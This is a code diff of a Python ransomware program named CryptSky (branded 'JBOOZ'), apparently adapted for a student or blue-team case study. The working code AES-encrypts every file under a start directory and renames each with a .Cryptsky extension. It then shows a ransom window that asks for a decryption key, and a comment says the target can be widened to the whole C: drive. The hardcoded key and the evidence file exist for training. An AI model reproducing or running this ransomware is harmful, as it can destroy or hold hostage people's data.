@@ -1,4 +1,6 @@
 #!/usr/bin/env python
+from pathlib import Path
+
 from Cryptodome.Cipher import AES
 from Cryptodome.Util import Counter
 import argparse
@@ -6,133 +8,137 @@ import os
 import discover
 import modify
 import tkinter
+import threading
+import time
 
 # -----------------
 # GLOBAL VARIABLES
-# CHANGE IF NEEDED
 # -----------------
-#  set to either: '128/192/256 bit plaintext key' or False
+# hardcoded key to make easier for students to decrypt
 HARDCODED_KEY = 'yellow submarine'
-START_DIR = ['C:\\CryptMe']
+# Can change to C:/ later to encrypt drive, but this is for testing
+START_DIR = [r'C:/CryptMe']
+# Path of evidence file dropped to disk
+PATH = Path(r'C:/Windows/Temp/winUpdater.log')
 
 
-def get_parser():
-    parser = argparse.ArgumentParser(description='Cryptsky')
-    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
-                        action="store_true")
-    return parser
+class WindowThread(threading.Thread):
+    def run(self):
+
+        print("In Window Thread")
+        global root
+        root = tkinter.Tk()
+        frame = tkinter.Frame(root)
+        frame.grid()
+        frame.pack()
+        oops = tkinter.Label(frame, text="Oops... Looks like JBOOZ encrypted your files ¯\_(ツ)_/¯", font=('Helvetica', 20))
+        oops.pack()
+        # warning that if program closes early, one file will be in a partially encrypted limbo state
+        warning = tkinter.Label(root,
+                              text="Do not close this program or turn off the VM "
+                                   "until this window says it is safe to do so... "
+                                   "\nor face (some) permanent damage.\n You have been warned\n"
+                                   "In the meantime, feel free to look for the key.. "
+                                   "It's hidden somewhere on this system"
+                                , font=('Helvetica', 20))
+        warning.pack()
+        label = tkinter.Label(frame, text="Enter the decryption key below", font=('Helvetica', 20))
+        label.pack()
+        e = tkinter.Entry(frame, width=20, font=('Helvetica', 20))
+        e.pack()
+
+        def callback():
+            bool = decrypt(e.get())
+            if bool:
+                exit()
+            else:
+                dline = tkinter.Label(frame, text="Incorrect Key", font=('Helvetica', 20))
+                dline.pack()
+
+        button = tkinter.Button(frame, text="Decrypt", font=('Helvetica', 20), width=10, command=callback)
+        button.pack()
+        root.mainloop()
+        pass
 
 
 def decrypt(key):
     if check_key(key):
-        try:
-            os.remove(r'C:\Windows\Temp\winUpdater.log')
-        except FileNotFoundError:
-            pass
-
         ctr = Counter.new(128)
         crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)
         startdirs = START_DIR
         for currentDir in startdirs:
             for file in discover.discoverFiles(currentDir):
-                modify.modify_file_inplace(file, crypt.encrypt)
-        exit()
+                (name, ext) = os.path.splitext(file)
+                if ext in '.Cryptsky':
+                    modify.modify_file_inplace(file, crypt.encrypt)
+                    os.rename(file, name)
+        try:
+            print()
+            os.remove(r'C:\Windows\Temp\winUpdater.log')
+        except FileNotFoundError:
+            pass
+        label = tkinter.Label(root, text="Congratulations. Your files are now decrypted")
+        label.pack()
     else:
-        pass
-
+        return False
 
 
 def check_key(key):
     if key == HARDCODED_KEY:
         print("Key Match")
+        label = tkinter.Label(root, text="This is the correct key. \n"
+                                         "Your files are being decrypted but it may take a while. Please wait...")
+        label.pack()
         return True
     else:
         print("Key no match")
         return False
 
 
-def post_encrypt():
-
-    print("In Post")
-    root = tkinter.Tk()
-    frame = tkinter.Frame(root)
-    frame.grid()
-    frame.pack()
-    oops = tkinter.Label(frame, text="Oops... Looks like JBOOZ encrypted your files ¯\_(ツ)_/¯", font=('Helvetica', 20))
-    oops.pack()
-    label = tkinter.Label(frame, text="Enter the decryption key below", font=('Helvetica', 20))
-    label.pack()
-    e = tkinter.Entry(frame, width=20, font=('Helvetica', 20))
-    e.pack()
-
-    def callback():
-        decrypt(e.get())
-
-    button = tkinter.Button(frame, text="Decrypt", font=('Helvetica', 20), width=10, command=callback)
-    button.pack()
-    root.mainloop()
-    pass
-
-
 def main():
-    parser  = get_parser()
-    args    = vars(parser.parse_args())
-    decrypt = args['decrypt']
 
-    if decrypt:
-        try:
-            os.remove(r'C:\Windows\Temp\winUpdater.log')
-        except FileNotFoundError:
-            pass
-        key = input('Enter Your Key> ')
-
+    if PATH.is_file():
+        print("Already Encrypted :)")
+        window_thread = WindowThread()
+        window_thread.start()
+        time.sleep(10)
+        safe = tkinter.Label(root, text="It is now safe to stop execution of this program. "
+                                        "Hopefully you found the key ;)")
+        safe.pack()
     else:
-        try:
-            file = open(r'C:\Windows\Temp\winUpdater.log', 'r')
-            file.close()
-            print("Already Encrypted :)")
-            # If this file exists, the system is already encrypted
-            post_encrypt()
-            exit()
-        except FileNotFoundError:
-            # If this file does not exist, the system has not been encrypted yet... create the file
-            file = open(r'C:\Windows\Temp\winUpdater.log', 'w+')
-            file.write("CryptSky Malware has been run on this machine -- JBOOZ :)")
-            file.close()
 
-        # In real ransomware, this part includes complicated key generation,
-        # sending the key back to attackers and more
-        # maybe I'll do that later. but for now, this will do.
-        if HARDCODED_KEY:
-            key = HARDCODED_KEY
+        key = HARDCODED_KEY
+        ctr = Counter.new(128)
+        crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)
 
-        # else:
-        #     key = random(32)
+        # change this to fit needs.
+        startdirs = START_DIR
 
-    ctr = Counter.new(128)
-    crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)
+        # starts window so it appears while files are still being encrypted
+        window_thread = WindowThread()
+        window_thread.start()
 
-    # change this to fit your needs.
-    startdirs = START_DIR
+        # encrypt files
+        for currentDir in startdirs:
+            for file in discover.discoverFiles(currentDir):
+                modify.modify_file_inplace(file, crypt.encrypt)
+                os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
 
-    for currentDir in startdirs:
-        for file in discover.discoverFiles(currentDir):
-            modify.modify_file_inplace(file, crypt.encrypt)
-            # os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
-
-    ''' # Taken out for Case Studies
-    # This wipes the key out of memory
-    # to avoid recovery by third party tools
-    for _ in range(100):
-        key = random(32)
-        pass
-    '''
-
-    if not decrypt:
-        # post encrypt stuff
-        # desktop picture
-        # icon, etc
-        post_encrypt()
+        # write evidence file to disk
+        file = open(PATH, 'w+')
+        file.write("JBOOZ encrypted this with a custom version of CryptSky. "
+                   "The key for this version is: yellow submarine") # you're welcome blue team ;)
+        file.close()
+        safe = tkinter.Label(root, text="It is now safe to stop execution of this program. "
+                                        "Hopefully you found the key ;)")
+        safe.pack()
+        ''' # Taken out for Case Studies
+        # This wipes the key out of memory
+        # to avoid recovery by third party tools
+        for _ in range(100):
+            key = random(32)
+            pass
+        '''
 
 
 if __name__=="__main__":
